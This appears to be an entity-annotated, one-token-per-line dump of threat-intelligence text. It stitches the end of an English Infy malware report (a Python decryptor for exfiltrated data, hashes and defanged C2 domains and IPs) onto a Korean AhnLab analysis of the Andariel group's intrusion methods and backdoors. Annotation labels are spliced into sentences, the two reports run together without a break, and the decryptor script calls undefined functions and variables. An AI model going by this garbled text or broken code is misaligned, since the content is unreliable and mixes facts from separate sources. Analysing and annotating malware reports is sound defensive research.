.
Malware
logs
–
installation
time
,
DLL
path
and
name
,
log
path
,
number
of
downloads
,
number
of
successful/failed
connections
.

3
.
Information
about
the
victim
computer
:
Time
zone
,
list
of
drives
and
types
,
running
processes
,
disk
info
.

First
the
malware
adds
1
to
all
bytes
,
then
an
encryption
key
is
initialized
based
on
the
victim
computer
name
(
the
offset
in
the
key
is
calculated
by
sum
of
the
computer
name
letters
%key
length
)
.

Then
the
key
is
used
to
encrypt
the
data
(
see
decrypt
function
)
.

The
encrypted
data
is
then
base64
encoded
.

5/13

Exfiltration
data
decryption
python
code
:

import
os,sys
import
string
import
base64
import
fileinput
FIRST_PHASE
=
'
OQTJEqtsK0AUB9YXMwr8idozF7VWRPpnhNCHI6Dlkaubyxf5423jvcZ1LSGmge
'

SECOND_PHASE
=
'
PqOwI1eUrYtT2yR3p4E5o6WiQu7ASlDkFj8GhHaJ9sKdLfMgNzBx0ZcXvCmVnb
'
global
FULL_KEY

FULL_KEY=
'
'
def
sub_1_for_hex(str_input
)
:
str_output
=
'
'
for
letter
in
str_input
:
try
:
str_output
+=
chr(ord(letter)-1
)
except
:
print
'
sub_1_for_hex
func
problem
'
continue
return
str_output
def
sum_comp_name(comp_name
)
:
sum
=
0
for
letter
in
comp_name
:
sum+=
ord(letter
)
return
sum
def
init_key(comp
)
:
comp_name_sum
=
sum_comp_name(comp
)
carry
=
divmod(comp_name_sum
,
62
)
index
=
carry[1]
-1
end_key
=
FIRST_PHASE[:index]
key
=
FIRST_PHASE[index:]
6/13
key
=
key
+
end_key
key
=
key
+
key
return
key
def
decrypt(num_list,offset
)
:
global
FULL_KEY
input
=
'
'
for
num_str
in
num_list
:
try
:
input
+=
num_str.decode('hex
'
)
except
:
input
+=
'
)
'
result
=
'
'
for
i
,
c
in
enumerate(input
)
:
i
=
i
%
62
+1
try
:
index
=
FULL_KEY.index(c)-1
except
ValueError
:
result
+=
c
continue
translated
=
SECOND_PHASE[(index
-
i
+offset
)
%
len(SECOND_PHASE)]
result
+=
translated
return
result
def
found_infy_enc_data(line
)
:
found_infy_str
=
'
show=\'----------
Administration
Reporting
Service
'
found_infy_index
=
line.find(found_infy_str
)
if
not
found_infy_index==-1
:
return
True,found_infy_index
else
:
return
False,found_infy_index
def
extract_comp_name(line
)
:
7/13
comp
=
r'\xd\xa-----
'
comp_index
=
line.find(comp
)
comp_name
=
line[comp_index+len(comp):]
comp_name
=
comp_name[:comp_name.find('-----')]
print
'
(
(
(
=
)
)
)
'
+
comp_name
return
comp_name
def
extract_enc_data(line
)
:
header
=
r'\xd\xa_____
'
start_index
=
line.find(header)+len(header
)
line
=
line[start_index:]
endindex
=
line.index('_____\
'
value=
'
)
line
=
line[:endindex]
return
line
def
write_enc_infy_data_to_file(dec_line,comp_name,filename
)
:
file1
=
open(filename
+
'
\\
'
+
comp_name
+
'
.txt','ab
'
)
file1.writelines(dec_line
)
file1.close(
)
def
enc_wrapper(enc,comp_name
)
:
global
FULL_KEY
print
FULL_KEY

FULL_KEY
=
init_key(comp_name
)
enc_final
=
'
'
for
letter
in
enc
:
if
len(hex(ord(letter))[2:])==1
:
enc_final
+=
'
0
'
+
hex(ord(letter))[2:]
elif
len(hex(ord(letter))[2:])==2
:
enc_final
+=
hex(ord(letter))[2:]
else
:

8/13

print
'
not
good
hex
length
'
exit(
)
enc
=
enc_final.upper(
)
enc
=
enc.replace('2E','21
'
)
enc
=
enc.replace('C5DC5A
'
,
'
'
)
enc
=
enc.replace('D03D00
'
,
'
'
)
enc
=
enc.replace('0B0E','2121
'
)
enc
=
enc.replace('01','21
'
)
enc_len
=
len(enc
)
enc_rev
=
'
'
num_list
=
[]
enc_print
=
'
'
for
i
in
range(0,enc_len/2
)
:
enc_rev
=
enc[-2:]
if
not
enc_rev=='0B
'
and
not
enc_rev=='0E
'
and
not
enc_rev=='00
'
and
not
enc_rev=='D0
'
:
enc_print
+=enc_rev
num_list.append(enc_rev
)
enc=
enc[:-2]
#the
first
part
is
always
ok
dec_str
=
decrypt(num_list,0
)
final
=
sub_1_for_hex(dec_str
)
index
=
final.find('OK
:
Sent
'
)
if
index==-1
:
print
comp_name
+
'
-
did
not
found
OK
:
Sent
!!!!\n\n\n\n
'
#exit(
)
decrypt_data
=
comp_name
+
'
++==++
'
+
str(i
)
+
'
:
'
+
final
+
'
\n
'

9/13

final_start
=
final[0:500]
if
final_start
in
UNIQUE_DATA
:
print
comp_name
+
'
already
have
this
data
'
return

UNIQUE_DATA.append(final_start
)
index
=
final.find('Installed
Date
:
'
)
if
index==-1
:
for
i
in
range(1,61
)
:
dec_str
=
decrypt3(num_list,i
)
final
=
sub_1_for_hex(dec_str
)
##print
all
62
options
index2
=
final.find('PROGRAM
START
:
'
)
index3
=
final.find('Installed
Date
:
'
)
if
not
index2
==-1
or
not
index3
==-1
:
decrypt_data
+=
str(i
)
+
'
:
'
+
final
+
'
\n
'
write_enc_infy_data_to_file(decrypt_data,comp_name,FILE_OUTPUT_NAME
)
def
read_enc_data_files(
)
:
for
root,dir,files
in
os.walk(PDML_PATH
)
:
for
file
in
files
:
filename
=
root+
'
\\
'
+
file
if
os.path.isfile(filename
)
:
print
filename
for
line
in
fileinput.input([filename]
)
:
line
=
line.strip(
)
is_found,found_infy_index=
found_infy_enc_data(line
)
if
not
is_found
:
continue

10/13

line
=
line[found_infy_index:]
#get
computer
name
(
for
use
in
init_key(
)
later
)
comp_name
=
extract_comp_name(line
)

UNIQUE_COMP.append(comp_name
)
#get
the
infy B_malware.infosteal
encrypted
data
line
=
extract_enc_data(line
)
#base64
decode
enc_data
dec_line
=
line.decode('base64
'
)
#append
enc_data
to
file
write_enc_Infy_data_to_file(dec_line,comp_name,FILE_ENC_OUTPUT_NAME
)
enc_wrapper(dec_line,comp_name
)
try
:
read_enc_data_files(
)
except
:
print
'
exception
!
!
!
!
'

Appendix B_url.cncsvr
2
–IoCs

Infy B_malware.infosteal
version
31
:
f07e85143e057ee565c25db2a9f36491102d4e526ffb02c83e580712ec00eb27

Infy B_malware.infosteal
'
M
'
version
8.0
:
583349B7A2385A1E8DE682A43351798CA113CBBB80686193ECF9A61E6942786A

5.9.94.34 B_ip.cncsvr

138.201.0.134 B_ip.cncsvr

138.201.47.150 B_ip.cncsvr

144.76.250.205 B_ip.cncsvr

138.201.47.158 B_ip.cncsvr

138.201.47.153 B_ip.cncsvr

us1s2[.]strangled[.]net B_url.cncsvr

uvps1[.]cotbm[.]com B_url.cncsvr

gstat[.]strangled[.]net B_url.cncsvr

secup[.]soon[.]it B_url.cncsvr

p208[.]ige[.]es B_url.cncsvr

lu[.]ige[.]es B_url.cncsvr

updateserver1[.]com B_url.cncsvr

updateserver3[.]com B_url.cncsvr

updatebox4[.]com B_url.cncsvr

bestupdateserver[.]com B_url.cncsvr

bestupdateserver2[.]com B_url.cncsvr

11/13

bestbox3[.]com B_url.cncsvr

safehostline[.]com B_url.cncsvr

youripinfo[.]com B_url.cncsvr

bestupser[.]awardspace[.]info B_url.cncsvr

box4035[.]net B_ip.unknown B_url.cncsvr

box4036[.]net B_url.cncsvr

box4037[.]net B_url.cncsvr

box4038[.]net B_url.cncsvr

box4039[.]net B_url.cncsvr

box4040[.]net B_url.cncsvr

box4041[.]net B_url.cncsvr

box4042[.]net B_url.cncsvr

box4043[.]net B_url.cncsvr

box4044[.]net B_url.cncsvr

box4045[.]net B_url.cncsvr

box4046[.]net B_url.cncsvr

box4047[.]net B_url.cncsvr

box4048[.]net B_url.cncsvr

box4049[.]net B_url.cncsvr

box4050[.]net B_url.cncsvr

box4051[.]net B_url.cncsvr

box4053[.]net B_url.cncsvr

box4052[.]net B_url.cncsvr

box4054[.]net B_url.cncsvr

box4055[.]net B_url.cncsvr

box4056[.]net B_url.cncsvr

box4057[.]net B_url.cncsvr

box4058[.]net B_url.cncsvr

box4059[.]net B_url.cncsvr

box4060[.]net B_url.cncsvr

box4061[.]net B_url.cncsvr

box4062[.]net B_url.cncsvr

box4063[.]net B_url.cncsvr

box4064[.]net B_url.cncsvr

box4065[.]net B_url.cncsvr

box4066[.]net B_url.cncsvr

box4067[.]net B_url.cncsvr

box4068[.]net B_url.cncsvr

box4069[.]net B_url.cncsvr

box4070[.]net B_url.cncsvr

box4071[.]net B_url.cncsvr

box4072[.]net B_url.cncsvr

box4075[.]net B_url.cncsvr

box4078[.]net B_url.cncsvr

box4079[.]net B_url.cncsvr

box4080[.]net B_url.cncsvr

box4081[.]net B_url.cncsvr

box4082[.]net B_url.cncsvr

box4083[.]net B_url.cncsvr

box4084[.]net B_url.cncsvr

12/13

box4085[.]net B_url.cncsvr

box4086[.]net B_url.cncsvr

box4087[.]net B_url.cncsvr

box4088[.]net B_url.cncsvr

box4089[.]net B_url.cncsvr

box4090[.]net B_url.cncsvr

13/13
2018.05.23

Andariel
Group
동향
보고서

안랩
시큐리티대응센터
(
ASEC
)
분석연구팀

경기도
성남시
분당구
판교역로
220
(
우
)
13493
|
대표전화
:
031-722-8000
|
팩스
:
031-722-8901
|
www.ahnlab.com

©
AhnLab
,
Inc
.
All
rights
reserved
.

Analysis
Report_Andariel
Threat
Group
개요
............................................................................................................................................................................................
3
공격
방식
(
Infection
Vector
)
............................................................................................................................................
4
1
.
스피어피싱
(
Spear B_malware.drop
Phishing  i
)
..................................................................................................................................
4
2
.
워터링홀
(
ActiveX B_malware.drop
취약점
)
......................................................................................................................................
6
3
.
중앙관리
솔루션
........................................................................................................................................................
7
4
.
공급망
(
Supply  B_malware.drop
Chain i
)
공격
.................................................................................................................................
10
주요
공격
사례
...................................................................................................................................................................
10
주요
악성코드
및
공격
도구
분석
............................................................................................................................
13
1
.
악성코드
–
백도어
(
Backdoor
)
...........................................................................................................................
13
1.1
)
Aryan
.....................................................................................................................................................................
13
1.2
)
Ghostrat  B_malware.backdoor
...............................................................................................................................................................
13
1.3
)
Rifdoor B_malware.backdoor
.................................................................................................................................................................
14
1.4
)
Phandoor  B_malware.backdoor
.............................................................................................................................................................
16
1.5
)
Andaratm  B_malware.backdoor
............................................................................................................................................................
17
2
.
공격
도구
(
Tools
)
......................................................................................................................................................
18
다수
공격
사례의
연관성
..............................................................................................................................................
19
안랩
제품의
대응
현황
...................................................................................................................................................
21
결론
..........................................................................................................................................................................................
22
참고자료
.................................................................................................................................................................................
23

©
AhnLab
,
Inc
.
All
rights
reserved
.
2

Analysis
Report_Andariel
Threat
Group
안다리엘
그룹
(
Andariel
Group
)
은
라자루스
(
Lazarus
)
공격
그룹의
하위
그룹으로
,
지난
2015년부터
활동이
확인되었다
.

이
위협
그룹은
2014년과
2015년에
걸쳐
발생한
사이버
공격
'
오퍼레이션
블랙
마인
(
Operation B_malware.backdoor
Black i
Mine  i
)
'
과도
연관성이
있다
.
1

오퍼레이션
블랙
마인은
이
보다
앞선
2008년
한국
군사
기관
공격
,
2013년
3.20
전산망
장애
(
일명
다크서울
,
DarkSeoul B_malware.ddos
)
와
관련
있다
.

안다리엘
그룹의
주요
공격
대상은
군사
기관
및
방위산업체
,
정치
기구
,
보안
업체
,
ICT
업체
,
에너지연구소
뿐만
아니라
ATM
,
금융사
,
여행사
,
온라인
도박
게임
이용자
,
가상화폐
거래소
이용자
등
금전적
이득을
얻을
수
있는
타깃까지
다양하다
.

주요
공격
방법은
매크로
(
Macro
)
를
이용한
스피어피싱
(
Spear B_malware.drop
Phishing  i
)
,
액티브X
(
Active-X  B_malware.drop
)
취약점을
이용한
워터링홀
,
보안
및
IT
자산
관리
시스템
취약점
공격
,
공급망
공격
등이다
.

이
위협
그룹은
Aryan
,
Ghostrat  B_malware.backdoor
등
알려진
외부
백도어뿐만
아니라
Andarat
,
Andaratm  B_malware.backdoor
,
Rifdoor B_malware.backdoor
,
Phandoor  B_malware.backdoor
등
자체
개발한
백도어도
사용하고
있다
.

또한
이
위협
그룹은
한국어에
능통한
것으로
보이며
,
한국의
IT
환경에
대해
잘
파악하고
있다
.

본
보고서에서는
안다리엘
공격
그룹의
공격
방식
,
주요
공격
사례를
살펴보고
,
공격
대상의
변화와
목적에
대해
알아본다
.

1
http://www.ahnlab.com/kr/site/securityinfo/secunews/secuNewsView.do?curPage=&menu_dist=1&seq=24229

©
AhnLab
,
Inc
.
All
rights
reserved
.
3

Analysis
Report_Andariel
Threat
Group
공격
방식
(
Infection
Vector
)
안다리엘
그룹은
다양한
공격
기법을
사용하고
있으며
,
특히
한국의
소프트웨어
취약점을
주로
이용한다
.

[
그림
1
]
안다리엘
그룹의
주요
공격
방식
1
.
스피어피싱
(
Spear B_malware.drop
Phishing  i
)
안다리엘
그룹은
사전에
공격
대상의
정보를
파악하여
관심을
가질
만한
내용으로
위장한
문서를
이메일에
첨부하는
방식으로
공격을
전개한다
.

해당
문서
파일에는
매크로가
포함되어
있으며
,
메일
수신자가
매크로
기능을
활성화하도록
유도한다
.

수신자의
매크로
기능
활성화를
유도하는
방식은
2015년
이후
좀더
교묘하
게
발전한
모습을
보인다
.

[
그림
2
]
는
지난
2015년
공격에
사용된
문서
파일이다
.

이
문서
파일은
수신자가
본문을
확인하는데
별
다른
어려움이
없어
매크로를
활성화하지
않았을
가능성이
있다
.

©
AhnLab
,
Inc
.
All
rights
reserved
.

4

Analysis
Report_Andariel
Threat
Group
[
그림
2
]
2015년
공격에
사용된
문서
2017년
이후
발견된
문서는
[
그림
3
]
과
같이
문서
본문을
보는데
이상이
있는
것처럼
흐릿하게
위장함으로써
수신자의
매크로
활성화를
유도하고
있다
.

[
그림
3
]
2017년
공격에
사용된
문서

©
AhnLab
,
Inc
.
All
rights
reserved
.

5

Analysis
Report_Andariel
Threat
Group
2018년
5월
현재까지
안다리엘
그룹이
한글파일
(
HWP
)
을
공격에
이용한
사례는
확인되지
않았다
.

2
.
워터링홀
(
ActiveX B_malware.drop
취약점
)
워터링홀
(
Watering-hole B_malware.drop
)
공격
기법은
공격자가
공격
대상이
방문할
만한
웹사이트를
해킹해
취약점
공격
코드를
숨겨두는
것으로
,
공격
대상이
취약한
웹
브라우저를
이용해
해당
웹사이트에
접속하면
악성코드에
감염되는
방식이다
.

특정
IP주소
(
IP
Address
)
에서
접속할
경우에만
,
즉
공격자가
원하는
특정
대상만
악성코
드에
감염되도록
함으로써
공격
대상의
발견을
어렵게
하는
사례도
있다
.

안다리엘
그룹은
주로
액티브X
취약점
공격
코드를
웹사이트에
숨겨두고
사용자가
특정한
액티브X가
설치된
인터넷
익스플로러
웹브라우저를
통해
해당
웹사이트에
접속하면
취약점
공격이
진행되는
방식을
이용하고
있다
.

취약점
공격에
성공하면
웹브라우저로
접속한
시스템에
자바
스크립트나
VB
스크립트
파일이
생성되며
,
이를
통해
특정
주소에서
악성코드를
다운로드한다
.

[
그림
4
]
감염
시스템에
생성되는
스크립트
파일
이때
윈도우
실행
파일을
의미하는
MZ
문자열이
존재하지
않으며
,
로컬에서
MZ로
시작하는
문자열을
추가해
실행
파일을
만든다
.

이는
실행
파일이
다운로드
될
때
행위
기반
보안
솔루션에
의해
탐지되는
것을
피하기
위한
목적으로
보인다
.

©
AhnLab
,
Inc
.
All
rights
reserved
.

6

Analysis
Report_Andariel
Threat
Group
[
그림
5
]
다운로드된
파일
(
위
)
과
5바이트
복구된
파일
(
아래
)

3
.
중앙관리
솔루션
일정
규모
이상의
기관
및
기업에서는
대부분
PC
등
조직
내
다수의
시스템을
중앙관리
솔루션에
연결하여
관리한다
.

이러한
중앙관리
솔루션의
역할은
주로
네트워크접근제어
(
NAC
)
,
백신
(
Anti-virus
)
,
소프트웨어
및
하드웨어
자산
,
소프트웨어
패치
(
PMS
)
관리
등이며
,
대개
IT
자산
관리
,
보고서
생성
,
소프트웨어
배포
,
원격제어
등의
기능을
제공한다
.

공격자는
공격
대상인
기관
또는
기업에서
사용하는
중앙관리
솔루션을
파악한
후
이를
분석하여
취약점을
찾아
공격에
이용한다
.

중앙관리
솔루션
공격은
크게
관리
서버
계정을
이용한
공격과
클라이언트
에이전트
취약점을
이용한
공격으로
구분할
수
있다
.

©
AhnLab
,
Inc
.
All
rights
reserved
.

7

Analysis
Report_Andariel
Threat
Group
[
그림
6
]
중앙관리
솔루션
개념도
대부분의
중앙관리
솔루션은
관리
서버와
에이전트가
설치되는
클라이언트로
구성된다
.

관리
서버는
연결된
시스템에
일괄적으로
파일을
보내거나
정책을
적용하며
원격
제어를
할
수
있다
.

클라이언트는
관리
서버에서
발송된
파일과
명령을
처리한다
.

관리
서버를
이용한
공격의
경우
,
공격자는
공격
대상의
관리자
페이지
계정을
탈취하여
정상
파일
대신
악성코드를
배포할
수
있다
.

관리자
계정의
보안
관리가
강조되는
이유는
바로
이
때문이다
.

또한
관리
서버는
상용
소프트웨어의
보안
업데이트
파일을
외부
(
소프트웨어
제공사
)
에서
받아와
조직
내부에
배포하는
역할을
한다
.

이때
외부
업데이트
서버의
파일이
해킹
등에
의해
변조되었을
경우
,
악성코드가
포함된
업데이트
파일이
중앙관리
서버를
통해
기업
및
기관에
배포되는
상황이
발생한다
.

중앙관리
솔루션의
클라이언트
에이전트는
관리
서버에서
전송된
파일을
수신하여
실행하는
역할을
한다
.

일반적으로
에이전트는
전달된
명령이나
파일이
적합성이
확인된
것인지
검사하는
기능을
갖고
있다
.

공격자는
이를
우회하기
위해
관리
서버인것처럼
가장해
에이전트에
명령을
전송한다
.

안다리엘
그룹은
한국에서
많이
사용되는
중앙관리
솔루션을
이용한
다수의
공격을
전개한
바
있다
.

다음은
세
종류의
중앙관리
솔루션의
클라이언트
에이전트의
취약점을
이용해
파일을
전송한
사례다
.

첫
번째
사례는
중앙관리
솔루션
A의
취약점을
공격하는
악성코드로
,
지난
2015년에
처음
발견되었다
.

해당
악성코드가
실행되면
지정된
IP
주소를
통해
중앙관리
솔루션
A의
에이전트에
악성코드가
포함된
실행
파일
v3pscan.exe B_malware.drop
를
전송하고
실행된다
.

©
AhnLab
,
Inc
.
All
rights
reserved
.

8

Analysis
Report_Andariel
Threat
Group
[
그림
7
]
원격
실행
명령어
중앙관리
솔루션
B의
취약점을
이용한
공격은
2015년부터
2017년까지
존재했다
.

다양한
종류의
악성코드
가
사용되었으며
,
nc.exe  B_malware.drop
,
nt.exe  B_malware.drop
,
n5lic.exe B_malware.drop
,
nc5rt2.exe  B_malware.drop
,
Bin.exe B_malware.drop
등이
있다
.

또한
vs1.vbs B_malware.drop
,
winrm.vbs B_malware.drop
등의
VB
스
크립트
파일을
생성해
악성
파일을
다운로드한다
.

2015년부터
2017년
사이에
발견된
변형은
서버
IP
,
타깃
시스템
IP
,
다운로드
주소
,
원격
실행
파일
경로
등을
인자로
받아
취약점
공격에
성공한
시스템
상에서
악성코드를
다운로드하는
스크립트
파일을
생성한다
.

해당
스크립트는
인자로
입력된
주소로부터
파일을
다운로드한
다음
5바이트를
복구한다
.

[
그림
8
]
중앙관리
솔루션
B에
대한
공격
도구
중앙관리
솔루션
C의
취약점을
이용한
악성코드는
2016년
9월에
처음
발견되었으며
,
파일
전송
및
실행
등을
수행한다
.

©
AhnLab
,
Inc
.
All
rights
reserved
.

9

Analysis
Report_Andariel
Threat
Group
[
그림
9
]
관리
소프트웨어
C
공격
도구
4
.
공급망
(
Supply
Chain
)
공격
안다리엘
그룹은
다양한
공급망을
이용한
공격을
시도했다
.
소프트웨어
설치판에
악성코드를
포함시켜
해당
소프트웨어의
공식사이트를
통해
배포하는
방식과
소프트웨어
업데이트
과정을
통해
악성코드를
감염시키는
방식을
주로
이용한다
.

일부
공격
사례에서는
해당
소프트웨어를
사용하는
모든
사용자를
감염시키는
것이
아니라
접속하는
IP
주소를
확인해
원하는
시스템만
감염시키는
방식을
사용했다
.

이
밖에도
특정
산업
분야에서
사용되는
시스템과
관련된
소프트웨어의
취약점을
이용한
공격을
진행했다
.

주요
공격
사례
안다리엘
그룹의
초기
공격
목표는
군사
기관과
방위산업체였다
.

지난
2015년에는
서울
국제항공우주
및
방위산업
전시회
(
Seoul
International
Aerospace
&
Defense
Exhibition
,
ADEX
)
참가
업체에
대한
공격이
있었다
.

ADEX는
1996년부터
격년으로
진행되는
국제
방위산업
전시회이다
.

공격자는
행사
주최측으로
가장해
매크로를
포함한
엑셀이나
워드
문서를
첨부한
이메일을
발송했다
.

첨부
문서는
행사
관련
내용으로
위장하였으며
,
사용자가
파일을
열어
'
콘텐츠
사용
'
을
클릭해
매크로
기능을
활성화하면
악성코드가
다운로드된다
.

다운로드된
파일은
Rifdoor B_malware.backdoor
변형이었다
.

이후
발견된
문서
파일로
미루어
이
공격
그룹이
주로
방위산업체에
대한
공격을
지속적으로
진행한
것으로
보인다
.

[
표
1
]
은
안다리엘
그룹의
주요
공격
사례를
정리한
것이다
.

©
AhnLab
,
Inc
.
All
rights
reserved
.

10

Analysis
Report_Andariel
Threat
Group
발견
시기
공격
대상
공격
방식
악성
행위
2015년
7월
자산관리
솔루션
해당
업체의
디지털
인증서
유출해
서명을
악성코드
악용
2015년
11월
ADEX
참가
업체
매크로
이용한
스피어피싱
보안
업체의
디지털
인증서
유출해
2016년
2월
보안
업체
보안
프로그램
취약점
악성코드에
서명
악용
2015년
11월부터
공격
시도
추정
2016년
2월
DRM
제품
가장
방위산업체
,
해양
,
2016년
4월
ICT
서비스
제공
중앙관리
솔루션
B
취약점
2016년
6월
방위산업
관련
대기업
2016년
8월
군사
관련
기관
중앙관리
시스템
A
취약점
항공기
설계도
등
기밀
자료
유출
백신
프로그램
관리
시스템
취약점
군사
정보
유출
2016년
10월
도박
게임
사용자
각종
유틸리티
설치
파일
도박성
게임
패
훔쳐보기
2017년
1월
도박
게임
사용자
PC방
관리
시스템
취약점
도박성
게임
패
훔쳐보기
2017년
3월
ATM
제조
업체
및
백신
프로그램
관리
ATM
기기
시스템
취약점
신용카드
정보
유출
후
해외에서
카드
복제
(
복제카드
사용자
검거
)
2016년
11월부터
공격
전개
추정
2017년
3월
지급
결제
대행
소프트웨어
위장
(
혹은
변조
)
악성코드
추가
다운로드
2017년
4월
에너지
연구소
최소
2차례
공격
시도
2017년
5월
리포트
A
액티브X
취약점
금융
노조
홈페이지
통해
악성코드
감염
2017년
6월
2017년
10월
여행사
A
중앙관리
솔루션
B
취약점
,
스피어피싱
(
매크로
)
리포트
A
취약점
,
개인
정보
유출
중앙관리
솔루션
B
취약점
2017년
9월부터
공격
시작
추정
2017년
12월
여행사
B
2017년
12월
ERP
제품
A
업데이트
여행사
A
공격에
사용된
악성코드와
유사
업데이트
관련
파일
변조해
악성코드
추가
다운로드
특정
가상화폐
거래소를
통해
다운
2017년
12월
가상화폐
사용자
원격지원
A
설치
파일
로드
시
악성코드
포함된
파일
다
2018년
2월
가상화폐
사용자
매크로
이용한
메일
국회
의원실
사칭
2018년
4월
ERP
제품
B
액티브X
취약점
[
표
1
]
안다리엘
그룹
주요
공격
사례

©
AhnLab
,
Inc
.
All
rights
reserved
.

11

Analysis
Report_Andariel
Threat
Group
2016년
2월
,
국내
보안업체가
해킹돼
전자
인증서가
유출된
사건이
발생한다.

2

또
이달에는
DRM
프로그램을
가장한
악성코드가
배포된
정황도
포착되었다
.

2016년
4월에는
방위산업체
,
해양
서비스
업체
,
ICT
기업
등이
중앙관리
솔루션
B의
취약점을
이용한
악성
코드
Ghostrat  B_malware.backdoor
에
감염되었다
.

2016년
6월
,
경찰은
중앙관리
솔루션의
취약점을
이용한
방위산업
관련
대기업
해킹
,
일명
'
유령
쥐
작전
(
Operation B_malware.drop
Ghost i
Rat i
)
'
을
공개했다
.
3

Ghostrat  B_malware.backdoor
은
중앙관리
솔루션
A의
취약점을
이용하여
파일
배포
기능을
통해
감염을
시도하는
악성코드로
,
대기업
해킹에
이용된
Ghostrat  B_malware.backdoor
악성코드에
의해
유출된
문서는
약
4만여건으로
확인되었다
.

안다리엘
그룹은
2016년
8월부터
백신
관리
프로그램의
취약점을
이용해
군사
관련
기관
내부를
공격해
군사
정보를
유출한다
.

4

2016년
말부터는
군사
정보
유출에서
금전적
이익
획득으로
공격을
확장한다
.

2016년
10월에는
소프트웨어
제작사
홈페이지를
해킹해
정상
설치
파일을
악성코드가
포함된
파일로
바꿔치기해
온라인
도박
게임에서
상대방의
패를
몰래
엿볼
수
있는
악성코드를
배포한다
.

2017년에는
공격
성공
가능성을
극대화하기
위해
PC방
관리
프로그램을
이용해
다수의
컴퓨터에
악성코드를
유포했다
.

2017년
3월
,
국내에서
ATM
기기가
해킹되어
신용카드
정보가
유출된
사건이
알려진다
.

5

2016년
11월부터
공격을
시도한
것으로
보이며
,
공격에
사용된
악성코드는
2016년
관사
관련
기관의
자료
유출에
사용된
악성코드와
유사했다
.

2017년
5월부터
7월까지는
금융권을
집중
공격했다
.

금융사
노조의
홈페이지를
통해
악성코드를
유포하거나
금융
기관에서
사용되는
시스템의
취약점을
이용해
공격을
시도했다
.

2017년
10월
,
국내
최대
여행사가
해킹
당해
개인정보가
유출되었다
.
6

같은
해
12월에는
또
다른
여행사
해킹이
확인되었다
.

2017년
12월
,
안다리엘
그룹은
A사의
ERP
솔루션
업데이트
파일을
변조해
악성
코드가
다운로드되도록
했다
.
7

당시
해당
ERP
솔루션을
사용하는
모든
업체가
아니라
특정한
공격
대상인
기업에만
악성코드가
다운로드되었다
.

2
http://news.joins.com/article/19706272
3
http://www.yonhapnews.co.kr/northkorea/2016/06/13/1801000000AKR20160613092851004.HTML
4
http://www.etnews.com/20161001000007
5
http://news.khan.co.kr/kh_news/khan_art_view.html?artid=201709061203001&code=940100
6
http://news.chosun.com/site/data/html_dir/2017/10/17/2017101703770.html
7
http://www.ddaily.co.kr/news/article.html?no=164197


©
AhnLab
,
Inc
.
All
rights
reserved
.

12

Analysis
Report_Andariel
Threat
Group
안다리엘
그룹은
2017년
12월부터
가상화폐
거래소
사용자를
대상으로
공격이
전개한다
.

또한
2018년
1월에는
악성코드가
포함된
원격
지원
프로그램을
배포했으며
,
2018년
2월에는
국회의원실을
사칭한
이메일
공격을
시도하는
등
8
다양한
공격
양상을
보였다
.

국회의원실
사칭한
메일이
다운로드하는
악성코드는
2017년
ATM
해킹에
사용된
악성코드의
변형으로
,
또
다른
변형이
6월
금융권
공격에도
사용되었다
.

주요
악성코드
및
공격
도구
분석
1
.
악성코드
–
백도어 B_malware.backdoor
(
Backdoor  B_malware.backdoor
)
안다리엘
그룹은
자체
제작한
Andarat B_malware.backdoor
,
Andaratm  B_malware.backdoor
,
Phandoor  B_malware.backdoor
,
Rifdoor B_malware.backdoor
뿐만
아니라
Aryan B_malware.backdoor
,
Ghostrat  B_malware.backdoor
등
알려진
다른
악성코드도
이용하고
있다
.
1.1
)
Aryan B_malware.backdoor
Arayan  B_malware.backdoor
은
2015년에
발견되었으며
,
'
F**k
Hack
Hound
.
'
이라는
문자열을
포함하고
있는
것이
특징이다
.

1.2
)
Ghostrat  B_malware.backdoor
[
그림
10
]
Aryan B_malware.backdoor
의
특징적인
문자열

Ghostrat  B_malware.backdoor
은
중국에서
제작된
백도어로
,
소스코드도
공개되어
있다
.

안다리엘
그룹은
이
악성코드를
2015년부터
2016년
사이에
전개한
공격에
사용했으며
,
일부는
한국어판을
제작해
사용하기도
했다
.

일부
변형은
Themida  B_malware.backdoor
등의
패커로
패킹했다
.

8
https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=27000

©
AhnLab
,
Inc
.
All
rights
reserved
.

13

Analysis
Report_Andariel
Threat
Group
[
그림
11
]
Ghostrat  B_malware.backdoor
의
특징적인
문자열
[
그림
12
]
는
안다리엘
그룹이
한글화하여
사용한
중국
공격
도구들이다
.

[
그림
12
]
중국어
및
한국어
콘트롤러
1.3
)
Rifdoor B_malware.backdoor
Rifdoor B_malware.backdoor
는
2015년
11월에
처음
발견되었으며
,
2016년
초까지
활동이
확인되었다
.

Rifdoor B_malware.backdoor
변형은
2015년
서울
아덱스
(
SEOUL
ADEX
)
참가
업체
공격에
사용되었으며
,
2016년
초
보안
업체
해킹에도
사용되었다
.

Rifdoor B_malware.backdoor
는
PDB에
'
E:\Data\My
Projects\Troy
Source
Code\tcp1st\rifle\Release\rifle.pdb
'
라는
문자열을
포함하고
있는
특징을
보인다
.

©
AhnLab
,
Inc
.
All
rights
reserved
.

14

Analysis
Report_Andariel
Threat
Group
[
그림
13
]
Rifdoor B_malware.backdoor
의
PDB
정보
Rifdoor B_malware.backdoor
는
시스템에
유입되면
파일
마지막
부분의
4
바이트에
가비지
데이터
(
garbage
data
)
를
추가해
파일을
생성한다
.

따라서
시스템
감염
시
매번
해시
값이
달라지기
때문에
단순
해시
값으로
시스템에서
해당
악성코드를
찾을
수
없다
.

[
그림
14
]
원본
파일과
생성
파일
비교
[
표
2
]
는
Rifdoor B_malware.backdoor
와
관련된
주요
명령
및
해당
기능이다
.

$interval
$downloadexec
파일
다운로드
후
실행
$download
파일
다운로드
(
기본
)
Cmd.exe
실행
[
표
2
]
Rifdoor B_malware.backdoor
주요
명령
Rifdoor B_malware.backdoor
변형은
[
표
3
]
과
같이
PDB
정보가
조금씩
다르다
.

©
AhnLab
,
Inc
.
All
rights
reserved
.

15

Analysis
Report_Andariel
Threat
Group
C:\Users\C8\Desktop\rifle\Release\rifle.pdb
E:\Data\My
Projects\Troy
Source
Code\tcp1st\rifle\Release\rifle.pdb
E:\Data\My
Projects\Troy
Source
Code\tcp1st\server\Release\server.pdb
[
표
3
]
Rifdoor B_malware.backdoor
변형의
PDB
정보
1.4
)
Phandoor  B_malware.backdoor
Phandoor  B_malware.backdoor
는
2016년
1월부터
2017년
여름까지
공격에
사용되었다
.

주요
문자열
앞에
'
S^%
'
가
붙는
것이
특징이다
(
S^%s\cmd.exe
,
S^nehomegpa.dll
'
등
)
.

그러나
2017년에
발견된
변형은
'
Anonymous? B_malware.ddos
'
문자열이
존재하지
않은
